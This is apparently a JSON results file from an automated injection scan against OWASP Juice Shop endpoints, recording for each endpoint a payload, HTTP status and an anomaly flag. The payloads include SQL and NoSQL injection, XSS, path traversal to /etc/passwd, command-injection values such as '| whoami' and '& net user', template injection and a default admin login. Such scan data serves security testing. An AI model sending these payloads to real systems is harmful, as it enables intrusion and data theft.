@@ -1,0 +1,1192 @@
+[
+  {
+    "endpoint": "/",
+    "payload": "' OR '1'='1",
+    "status": 200,
+    "anomaly": true,
+    "note": "200 but contains error text — leaking debug info"
+  },
+  {
+    "endpoint": "/",
+    "payload": "'; DROP TABLE users;--",
+    "status": 200,
+    "anomaly": true,
+    "note": "200 but contains error text — leaking debug info"
+  },
+  {
+    "endpoint": "/",
+    "payload": "1' AND SLEEP(5)--",
+    "status": 200,
+    "anomaly": true,
+    "note": "200 but contains error text — leaking debug info"
+  },
+  {
+    "endpoint": "/",
+    "payload": "<script>alert(1)</script>",
+    "status": 200,
+    "anomaly": true,
+    "note": "200 but contains error text — leaking debug info"
+  },
+  {
+    "endpoint": "/",
+    "payload": "<img src=x onerror=alert(1)>",
+    "status": 200,
+    "anomaly": true,
+    "note": "200 but contains error text — leaking debug info"
+  },
+  {
+    "endpoint": "/",
+    "payload": "../../../../etc/passwd",
+    "status": 200,
+    "anomaly": true,
+    "note": "200 but contains error text — leaking debug info"
+  },
+  {
+    "endpoint": "/",
+    "payload": "..\\..\\windows\\system32\\drivers\\etc\\hosts",
+    "status": 200,
+    "anomaly": true,
+    "note": "200 but contains error text — leaking debug info"
+  },
+  {
+    "endpoint": "/",
+    "payload": "; ls -la",
+    "status": 200,
+    "anomaly": true,
+    "note": "200 but contains error text — leaking debug info"
+  },
+  {
+    "endpoint": "/",
+    "payload": "| whoami",
+    "status": 200,
+    "anomaly": true,
+    "note": "200 but contains error text — leaking debug info"
+  },
+  {
+    "endpoint": "/",
+    "payload": "& net user",
+    "status": 200,
+    "anomaly": true,
+    "note": "200 but contains error text — leaking debug info"
+  },
+  {
+    "endpoint": "/",
+    "payload": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+    "status": 200,
+    "anomaly": true,
+    "note": "200 but contains error text — leaking debug info"
+  },
+  {
+    "endpoint": "/",
+    "payload": "test\u0000injection",
+    "status": 200,
+    "anomaly": true,
+    "note": "200 but contains error text — leaking debug info"
+  },
+  {
+    "endpoint": "/",
+    "payload": "%s%s%s%s%n",
+    "status": 200,
+    "anomaly": true,
+    "note": "200 but contains error text — leaking debug info"
+  },
+  {
+    "endpoint": "/",
+    "payload": "{\"email\":\"admin@juice-sh.op\",\"password\":\"admin123\"}",
+    "status": 200,
+    "anomaly": true,
+    "note": "200 but contains error text — leaking debug info"
+  },
+  {
+    "endpoint": "/",
+    "payload": "{\"$gt\": \"\"}",
+    "status": 200,
+    "anomaly": true,
+    "note": "200 but contains error text — leaking debug info"
+  },
+  {
+    "endpoint": "/",
+    "payload": "{{7*7}}",
+    "status": 200,
+    "anomaly": true,
+    "note": "200 but contains error text — leaking debug info"
+  },
+  {
+    "endpoint": "/",
+    "payload": "${7*7}",
+    "status": 200,
+    "anomaly": true,
+    "note": "200 but contains error text — leaking debug info"
+  },
+  {
+    "endpoint": "/rest/user/login",
+    "payload": "' OR '1'='1",
+    "status": 500,
+    "anomaly": true,
+    "note": "500 Server Error — possible crash or unhandled exception"
+  },
+  {
+    "endpoint": "/rest/user/login",
+    "payload": "'; DROP TABLE users;--",
+    "status": 500,
+    "anomaly": true,
+    "note": "500 Server Error — possible crash or unhandled exception"
+  },
+  {
+    "endpoint": "/rest/user/login",
+    "payload": "1' AND SLEEP(5)--",
+    "status": 500,
+    "anomaly": true,
+    "note": "500 Server Error — possible crash or unhandled exception"
+  },
+  {
+    "endpoint": "/rest/user/login",
+    "payload": "<script>alert(1)</script>",
+    "status": 500,
+    "anomaly": true,
+    "note": "500 Server Error — possible crash or unhandled exception"
+  },
+  {
+    "endpoint": "/rest/user/login",
+    "payload": "<img src=x onerror=alert(1)>",
+    "status": 500,
+    "anomaly": true,
+    "note": "500 Server Error — possible crash or unhandled exception"
+  },
+  {
+    "endpoint": "/rest/user/login",
+    "payload": "../../../../etc/passwd",
+    "status": 500,
+    "anomaly": true,
+    "note": "500 Server Error — possible crash or unhandled exception"
+  },
+  {
+    "endpoint": "/rest/user/login",
+    "payload": "..\\..\\windows\\system32\\drivers\\etc\\hosts",
+    "status": 500,
+    "anomaly": true,
+    "note": "500 Server Error — possible crash or unhandled exception"
+  },
+  {
+    "endpoint": "/rest/user/login",
+    "payload": "; ls -la",
+    "status": 500,
+    "anomaly": true,
+    "note": "500 Server Error — possible crash or unhandled exception"
+  },
+  {
+    "endpoint": "/rest/user/login",
+    "payload": "| whoami",
+    "status": 500,
+    "anomaly": true,
+    "note": "500 Server Error — possible crash or unhandled exception"
+  },
+  {
+    "endpoint": "/rest/user/login",
+    "payload": "& net user",
+    "status": 500,
+    "anomaly": true,
+    "note": "500 Server Error — possible crash or unhandled exception"
+  },
+  {
+    "endpoint": "/rest/user/login",
+    "payload": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+    "status": 500,
+    "anomaly": true,
+    "note": "500 Server Error — possible crash or unhandled exception"
+  },
+  {
+    "endpoint": "/rest/user/login",
+    "payload": "test\u0000injection",
+    "status": 500,
+    "anomaly": true,
+    "note": "500 Server Error — possible crash or unhandled exception"
+  },
+  {
+    "endpoint": "/rest/user/login",
+    "payload": "%s%s%s%s%n",
+    "status": 500,
+    "anomaly": true,
+    "note": "500 Server Error — possible crash or unhandled exception"
+  },
+  {
+    "endpoint": "/rest/user/login",
+    "payload": "{\"email\":\"admin@juice-sh.op\",\"password\":\"admin123\"}",
+    "status": 500,
+    "anomaly": true,
+    "note": "500 Server Error — possible crash or unhandled exception"
+  },
+  {
+    "endpoint": "/rest/user/login",
+    "payload": "{\"$gt\": \"\"}",
+    "status": 500,
+    "anomaly": true,
+    "note": "500 Server Error — possible crash or unhandled exception"
+  },
+  {
+    "endpoint": "/rest/user/login",
+    "payload": "{{7*7}}",
+    "status": 500,
+    "anomaly": true,
+    "note": "500 Server Error — possible crash or unhandled exception"
+  },
+  {
+    "endpoint": "/rest/user/login",
+    "payload": "${7*7}",
+    "status": 500,
+    "anomaly": true,
+    "note": "500 Server Error — possible crash or unhandled exception"
+  },
+  {
+    "endpoint": "/rest/products/search",
+    "payload": "' OR '1'='1",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/rest/products/search",
+    "payload": "'; DROP TABLE users;--",
+    "status": 500,
+    "anomaly": true,
+    "note": "500 Server Error — possible crash or unhandled exception"
+  },
+  {
+    "endpoint": "/rest/products/search",
+    "payload": "1' AND SLEEP(5)--",
+    "status": 500,
+    "anomaly": true,
+    "note": "500 Server Error — possible crash or unhandled exception"
+  },
+  {
+    "endpoint": "/rest/products/search",
+    "payload": "<script>alert(1)</script>",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/rest/products/search",
+    "payload": "<img src=x onerror=alert(1)>",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/rest/products/search",
+    "payload": "../../../../etc/passwd",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/rest/products/search",
+    "payload": "..\\..\\windows\\system32\\drivers\\etc\\hosts",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/rest/products/search",
+    "payload": "; ls -la",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/rest/products/search",
+    "payload": "| whoami",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/rest/products/search",
+    "payload": "& net user",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/rest/products/search",
+    "payload": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/rest/products/search",
+    "payload": "test\u0000injection",
+    "status": 500,
+    "anomaly": true,
+    "note": "500 Server Error — possible crash or unhandled exception"
+  },
+  {
+    "endpoint": "/rest/products/search",
+    "payload": "%s%s%s%s%n",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/rest/products/search",
+    "payload": "{\"email\":\"admin@juice-sh.op\",\"password\":\"admin123\"}",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/rest/products/search",
+    "payload": "{\"$gt\": \"\"}",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/rest/products/search",
+    "payload": "{{7*7}}",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/rest/products/search",
+    "payload": "${7*7}",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/api/Users",
+    "payload": "' OR '1'='1",
+    "status": 401,
+    "anomaly": true,
+    "note": "Stack trace leaked — information disclosure"
+  },
+  {
+    "endpoint": "/api/Users",
+    "payload": "'; DROP TABLE users;--",
+    "status": 401,
+    "anomaly": true,
+    "note": "Stack trace leaked — information disclosure"
+  },
+  {
+    "endpoint": "/api/Users",
+    "payload": "1' AND SLEEP(5)--",
+    "status": 401,
+    "anomaly": true,
+    "note": "Stack trace leaked — information disclosure"
+  },
+  {
+    "endpoint": "/api/Users",
+    "payload": "<script>alert(1)</script>",
+    "status": 401,
+    "anomaly": true,
+    "note": "Stack trace leaked — information disclosure"
+  },
+  {
+    "endpoint": "/api/Users",
+    "payload": "<img src=x onerror=alert(1)>",
+    "status": 401,
+    "anomaly": true,
+    "note": "Stack trace leaked — information disclosure"
+  },
+  {
+    "endpoint": "/api/Users",
+    "payload": "../../../../etc/passwd",
+    "status": 401,
+    "anomaly": true,
+    "note": "Stack trace leaked — information disclosure"
+  },
+  {
+    "endpoint": "/api/Users",
+    "payload": "..\\..\\windows\\system32\\drivers\\etc\\hosts",
+    "status": 401,
+    "anomaly": true,
+    "note": "Stack trace leaked — information disclosure"
+  },
+  {
+    "endpoint": "/api/Users",
+    "payload": "; ls -la",
+    "status": 401,
+    "anomaly": true,
+    "note": "Stack trace leaked — information disclosure"
+  },
+  {
+    "endpoint": "/api/Users",
+    "payload": "| whoami",
+    "status": 401,
+    "anomaly": true,
+    "note": "Stack trace leaked — information disclosure"
+  },
+  {
+    "endpoint": "/api/Users",
+    "payload": "& net user",
+    "status": 401,
+    "anomaly": true,
+    "note": "Stack trace leaked — information disclosure"
+  },
+  {
+    "endpoint": "/api/Users",
+    "payload": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+    "status": 401,
+    "anomaly": true,
+    "note": "Stack trace leaked — information disclosure"
+  },
+  {
+    "endpoint": "/api/Users",
+    "payload": "test\u0000injection",
+    "status": 401,
+    "anomaly": true,
+    "note": "Stack trace leaked — information disclosure"
+  },
+  {
+    "endpoint": "/api/Users",
+    "payload": "%s%s%s%s%n",
+    "status": 401,
+    "anomaly": true,
+    "note": "Stack trace leaked — information disclosure"
+  },
+  {
+    "endpoint": "/api/Users",
+    "payload": "{\"email\":\"admin@juice-sh.op\",\"password\":\"admin123\"}",
+    "status": 401,
+    "anomaly": true,
+    "note": "Stack trace leaked — information disclosure"
+  },
+  {
+    "endpoint": "/api/Users",
+    "payload": "{\"$gt\": \"\"}",
+    "status": 401,
+    "anomaly": true,
+    "note": "Stack trace leaked — information disclosure"
+  },
+  {
+    "endpoint": "/api/Users",
+    "payload": "{{7*7}}",
+    "status": 401,
+    "anomaly": true,
+    "note": "Stack trace leaked — information disclosure"
+  },
+  {
+    "endpoint": "/api/Users",
+    "payload": "${7*7}",
+    "status": 401,
+    "anomaly": true,
+    "note": "Stack trace leaked — information disclosure"
+  },
+  {
+    "endpoint": "/api/Products",
+    "payload": "' OR '1'='1",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/api/Products",
+    "payload": "'; DROP TABLE users;--",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/api/Products",
+    "payload": "1' AND SLEEP(5)--",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/api/Products",
+    "payload": "<script>alert(1)</script>",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/api/Products",
+    "payload": "<img src=x onerror=alert(1)>",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/api/Products",
+    "payload": "../../../../etc/passwd",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/api/Products",
+    "payload": "..\\..\\windows\\system32\\drivers\\etc\\hosts",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/api/Products",
+    "payload": "; ls -la",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/api/Products",
+    "payload": "| whoami",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/api/Products",
+    "payload": "& net user",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/api/Products",
+    "payload": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/api/Products",
+    "payload": "test\u0000injection",
+    "status": 500,
+    "anomaly": true,
+    "note": "500 Server Error — possible crash or unhandled exception"
+  },
+  {
+    "endpoint": "/api/Products",
+    "payload": "%s%s%s%s%n",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/api/Products",
+    "payload": "{\"email\":\"admin@juice-sh.op\",\"password\":\"admin123\"}",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/api/Products",
+    "payload": "{\"$gt\": \"\"}",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/api/Products",
+    "payload": "{{7*7}}",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/api/Products",
+    "payload": "${7*7}",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/rest/basket/1",
+    "payload": "' OR '1'='1",
+    "status": 401,
+    "anomaly": true,
+    "note": "Stack trace leaked — information disclosure"
+  },
+  {
+    "endpoint": "/rest/basket/1",
+    "payload": "'; DROP TABLE users;--",
+    "status": 401,
+    "anomaly": true,
+    "note": "Stack trace leaked — information disclosure"
+  },
+  {
+    "endpoint": "/rest/basket/1",
+    "payload": "1' AND SLEEP(5)--",
+    "status": 401,
+    "anomaly": true,
+    "note": "Stack trace leaked — information disclosure"
+  },
+  {
+    "endpoint": "/rest/basket/1",
+    "payload": "<script>alert(1)</script>",
+    "status": 401,
+    "anomaly": true,
+    "note": "Stack trace leaked — information disclosure"
+  },
+  {
+    "endpoint": "/rest/basket/1",
+    "payload": "<img src=x onerror=alert(1)>",
+    "status": 401,
+    "anomaly": true,
+    "note": "Stack trace leaked — information disclosure"
+  },
+  {
+    "endpoint": "/rest/basket/1",
+    "payload": "../../../../etc/passwd",
+    "status": 401,
+    "anomaly": true,
+    "note": "Stack trace leaked — information disclosure"
+  },
+  {
+    "endpoint": "/rest/basket/1",
+    "payload": "..\\..\\windows\\system32\\drivers\\etc\\hosts",
+    "status": 401,
+    "anomaly": true,
+    "note": "Stack trace leaked — information disclosure"
+  },
+  {
+    "endpoint": "/rest/basket/1",
+    "payload": "; ls -la",
+    "status": 401,
+    "anomaly": true,
+    "note": "Stack trace leaked — information disclosure"
+  },
+  {
+    "endpoint": "/rest/basket/1",
+    "payload": "| whoami",
+    "status": 401,
+    "anomaly": true,
+    "note": "Stack trace leaked — information disclosure"
+  },
+  {
+    "endpoint": "/rest/basket/1",
+    "payload": "& net user",
+    "status": 401,
+    "anomaly": true,
+    "note": "Stack trace leaked — information disclosure"
+  },
+  {
+    "endpoint": "/rest/basket/1",
+    "payload": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+    "status": 401,
+    "anomaly": true,
+    "note": "Stack trace leaked — information disclosure"
+  },
+  {
+    "endpoint": "/rest/basket/1",
+    "payload": "test\u0000injection",
+    "status": 401,
+    "anomaly": true,
+    "note": "Stack trace leaked — information disclosure"
+  },
+  {
+    "endpoint": "/rest/basket/1",
+    "payload": "%s%s%s%s%n",
+    "status": 401,
+    "anomaly": true,
+    "note": "Stack trace leaked — information disclosure"
+  },
+  {
+    "endpoint": "/rest/basket/1",
+    "payload": "{\"email\":\"admin@juice-sh.op\",\"password\":\"admin123\"}",
+    "status": 401,
+    "anomaly": true,
+    "note": "Stack trace leaked — information disclosure"
+  },
+  {
+    "endpoint": "/rest/basket/1",
+    "payload": "{\"$gt\": \"\"}",
+    "status": 401,
+    "anomaly": true,
+    "note": "Stack trace leaked — information disclosure"
+  },
+  {
+    "endpoint": "/rest/basket/1",
+    "payload": "{{7*7}}",
+    "status": 401,
+    "anomaly": true,
+    "note": "Stack trace leaked — information disclosure"
+  },
+  {
+    "endpoint": "/rest/basket/1",
+    "payload": "${7*7}",
+    "status": 401,
+    "anomaly": true,
+    "note": "Stack trace leaked — information disclosure"
+  },
+  {
+    "endpoint": "/rest/user/whoami",
+    "payload": "' OR '1'='1",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/rest/user/whoami",
+    "payload": "'; DROP TABLE users;--",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/rest/user/whoami",
+    "payload": "1' AND SLEEP(5)--",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/rest/user/whoami",
+    "payload": "<script>alert(1)</script>",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/rest/user/whoami",
+    "payload": "<img src=x onerror=alert(1)>",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/rest/user/whoami",
+    "payload": "../../../../etc/passwd",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/rest/user/whoami",
+    "payload": "..\\..\\windows\\system32\\drivers\\etc\\hosts",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/rest/user/whoami",
+    "payload": "; ls -la",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/rest/user/whoami",
+    "payload": "| whoami",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/rest/user/whoami",
+    "payload": "& net user",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/rest/user/whoami",
+    "payload": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/rest/user/whoami",
+    "payload": "test\u0000injection",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/rest/user/whoami",
+    "payload": "%s%s%s%s%n",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/rest/user/whoami",
+    "payload": "{\"email\":\"admin@juice-sh.op\",\"password\":\"admin123\"}",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/rest/user/whoami",
+    "payload": "{\"$gt\": \"\"}",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/rest/user/whoami",
+    "payload": "{{7*7}}",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/rest/user/whoami",
+    "payload": "${7*7}",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/api/Feedbacks",
+    "payload": "' OR '1'='1",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/api/Feedbacks",
+    "payload": "'; DROP TABLE users;--",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/api/Feedbacks",
+    "payload": "1' AND SLEEP(5)--",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/api/Feedbacks",
+    "payload": "<script>alert(1)</script>",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/api/Feedbacks",
+    "payload": "<img src=x onerror=alert(1)>",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/api/Feedbacks",
+    "payload": "../../../../etc/passwd",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/api/Feedbacks",
+    "payload": "..\\..\\windows\\system32\\drivers\\etc\\hosts",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/api/Feedbacks",
+    "payload": "; ls -la",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/api/Feedbacks",
+    "payload": "| whoami",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/api/Feedbacks",
+    "payload": "& net user",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/api/Feedbacks",
+    "payload": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/api/Feedbacks",
+    "payload": "test\u0000injection",
+    "status": 500,
+    "anomaly": true,
+    "note": "500 Server Error — possible crash or unhandled exception"
+  },
+  {
+    "endpoint": "/api/Feedbacks",
+    "payload": "%s%s%s%s%n",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/api/Feedbacks",
+    "payload": "{\"email\":\"admin@juice-sh.op\",\"password\":\"admin123\"}",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/api/Feedbacks",
+    "payload": "{\"$gt\": \"\"}",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/api/Feedbacks",
+    "payload": "{{7*7}}",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/api/Feedbacks",
+    "payload": "${7*7}",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/rest/qr-code",
+    "payload": "' OR '1'='1",
+    "status": 500,
+    "anomaly": true,
+    "note": "500 Server Error — possible crash or unhandled exception"
+  },
+  {
+    "endpoint": "/rest/qr-code",
+    "payload": "'; DROP TABLE users;--",
+    "status": 500,
+    "anomaly": true,
+    "note": "500 Server Error — possible crash or unhandled exception"
+  },
+  {
+    "endpoint": "/rest/qr-code",
+    "payload": "1' AND SLEEP(5)--",
+    "status": 500,
+    "anomaly": true,
+    "note": "500 Server Error — possible crash or unhandled exception"
+  },
+  {
+    "endpoint": "/rest/qr-code",
+    "payload": "<script>alert(1)</script>",
+    "status": 500,
+    "anomaly": true,
+    "note": "500 Server Error — possible crash or unhandled exception"
+  },
+  {
+    "endpoint": "/rest/qr-code",
+    "payload": "<img src=x onerror=alert(1)>",
+    "status": 500,
+    "anomaly": true,
+    "note": "500 Server Error — possible crash or unhandled exception"
+  },
+  {
+    "endpoint": "/rest/qr-code",
+    "payload": "../../../../etc/passwd",
+    "status": 500,
+    "anomaly": true,
+    "note": "500 Server Error — possible crash or unhandled exception"
+  },
+  {
+    "endpoint": "/rest/qr-code",
+    "payload": "..\\..\\windows\\system32\\drivers\\etc\\hosts",
+    "status": 500,
+    "anomaly": true,
+    "note": "500 Server Error — possible crash or unhandled exception"
+  },
+  {
+    "endpoint": "/rest/qr-code",
+    "payload": "; ls -la",
+    "status": 500,
+    "anomaly": true,
+    "note": "500 Server Error — possible crash or unhandled exception"
+  },
+  {
+    "endpoint": "/rest/qr-code",
+    "payload": "| whoami",
+    "status": 500,
+    "anomaly": true,
+    "note": "500 Server Error — possible crash or unhandled exception"
+  },
+  {
+    "endpoint": "/rest/qr-code",
+    "payload": "& net user",
+    "status": 500,
+    "anomaly": true,
+    "note": "500 Server Error — possible crash or unhandled exception"
+  },
+  {
+    "endpoint": "/rest/qr-code",
+    "payload": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+    "status": 500,
+    "anomaly": true,
+    "note": "500 Server Error — possible crash or unhandled exception"
+  },
+  {
+    "endpoint": "/rest/qr-code",
+    "payload": "test\u0000injection",
+    "status": 500,
+    "anomaly": true,
+    "note": "500 Server Error — possible crash or unhandled exception"
+  },
+  {
+    "endpoint": "/rest/qr-code",
+    "payload": "%s%s%s%s%n",
+    "status": 500,
+    "anomaly": true,
+    "note": "500 Server Error — possible crash or unhandled exception"
+  },
+  {
+    "endpoint": "/rest/qr-code",
+    "payload": "{\"email\":\"admin@juice-sh.op\",\"password\":\"admin123\"}",
+    "status": 500,
+    "anomaly": true,
+    "note": "500 Server Error — possible crash or unhandled exception"
+  },
+  {
+    "endpoint": "/rest/qr-code",
+    "payload": "{\"$gt\": \"\"}",
+    "status": 500,
+    "anomaly": true,
+    "note": "500 Server Error — possible crash or unhandled exception"
+  },
+  {
+    "endpoint": "/rest/qr-code",
+    "payload": "{{7*7}}",
+    "status": 500,
+    "anomaly": true,
+    "note": "500 Server Error — possible crash or unhandled exception"
+  },
+  {
+    "endpoint": "/rest/qr-code",
+    "payload": "${7*7}",
+    "status": 500,
+    "anomaly": true,
+    "note": "500 Server Error — possible crash or unhandled exception"
+  },
+  {
+    "endpoint": "/rest/admin/application-configuration",
+    "payload": "' OR '1'='1",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/rest/admin/application-configuration",
+    "payload": "'; DROP TABLE users;--",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/rest/admin/application-configuration",
+    "payload": "1' AND SLEEP(5)--",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/rest/admin/application-configuration",
+    "payload": "<script>alert(1)</script>",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/rest/admin/application-configuration",
+    "payload": "<img src=x onerror=alert(1)>",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/rest/admin/application-configuration",
+    "payload": "../../../../etc/passwd",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/rest/admin/application-configuration",
+    "payload": "..\\..\\windows\\system32\\drivers\\etc\\hosts",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/rest/admin/application-configuration",
+    "payload": "; ls -la",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/rest/admin/application-configuration",
+    "payload": "| whoami",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/rest/admin/application-configuration",
+    "payload": "& net user",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/rest/admin/application-configuration",
+    "payload": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/rest/admin/application-configuration",
+    "payload": "test\u0000injection",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/rest/admin/application-configuration",
+    "payload": "%s%s%s%s%n",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/rest/admin/application-configuration",
+    "payload": "{\"email\":\"admin@juice-sh.op\",\"password\":\"admin123\"}",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/rest/admin/application-configuration",
+    "payload": "{\"$gt\": \"\"}",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/rest/admin/application-configuration",
+    "payload": "{{7*7}}",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  },
+  {
+    "endpoint": "/rest/admin/application-configuration",
+    "payload": "${7*7}",
+    "status": 200,
+    "anomaly": false,
+    "note": ""
+  }
+]
